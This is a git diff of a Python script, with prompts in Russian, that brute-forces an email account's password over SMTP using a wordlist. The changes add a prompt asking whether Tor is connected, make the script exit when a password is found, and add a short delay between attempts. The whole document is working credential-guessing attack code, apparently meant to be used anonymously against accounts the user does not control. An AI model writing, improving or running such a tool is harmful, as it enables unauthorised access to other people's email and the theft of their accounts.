@@ -27,7 +27,7 @@ print("")
 print("by Deiri  v.1")
 print("")
 print("")
-print ('Начать поиск пароля?:')
+print ('У вас подключен tor в первой сессии?:')
 print ("")
 print ("[1] Да")
 print ("[2] Нет")
@@ -47,6 +47,7 @@ print("")
 if option == '1':
    passlist = input('Для начала введите путь к словарю: ')
 if option == '2':
+   print("Подключите tor в первой сессии")
    exit()
 pass_found=open(passlist, 'r')
 user_name = input('Логин : ')
@@ -58,8 +59,10 @@ for password in pass_found:
    try:
        server.login(user_name, password)
        print(Fore.GREEN + '[+] Пароль найден: ' + password)
+       exit()
        break;
    except smtplib.SMTPAuthenticationError:
       print(Fore.RED + '[-] Пароль не найден')
       print("")
+      time.sleep(0.0000001)
 input()
